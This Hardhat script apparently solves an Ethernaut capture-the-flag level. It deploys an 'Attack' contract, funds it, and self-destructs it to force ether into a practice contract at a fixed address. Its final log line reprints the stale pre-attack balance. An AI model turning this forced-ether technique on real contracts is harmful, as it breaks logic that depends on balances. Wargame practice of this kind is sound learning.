const { ethers, waffle } = require("hardhat");
var fs = require("fs");
const chalk = require('chalk');


async function main() {

    const level_instance_address = "0x2319b9D192345382650f3b55389944D3aEf33e9c" // ethernaut's deployed empty contract for us
    const [deployer] = await ethers.getSigners();
    const provider = waffle.provider;

    const deployerBalanceInWei = await provider.getBalance(level_instance_address);
    console.log(chalk.blue("Contract address is " + level_instance_address + " and has a balance of " + deployerBalanceInWei));

    console.log(chalk.white("Deploying Attack contract..."));
    const AttackInstance = await ethers.getContractFactory("Attack");
    const attackInstance = await AttackInstance.deploy({ gasLimit: 1000000 })
    await attackInstance.deployed();
    console.log(chalk.blue("Deployed AttackInstance contract at", attackInstance.address));

    let amountInEther = '0.0001';
    console.log(chalk.white("Sending", amountInEther, "ethereum to the AttackInstance contract"));
    let topup_attacker_tx_payload = { value: ethers.utils.parseEther(amountInEther), gasLimit: 50000 };
    topup_attacker_tx = await attackInstance.deposit(topup_attacker_tx_payload);
    await topup_attacker_tx.wait();
    destruct_tx = await attackInstance.destruct(level_instance_address);
    await destruct_tx.wait();
    console.log(chalk.blue("Tx is ", destruct_tx.hash));
    console.log(chalk.white("Contract address is " + level_instance_address + " and has a balance of " + deployerBalanceInWei));
}


main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });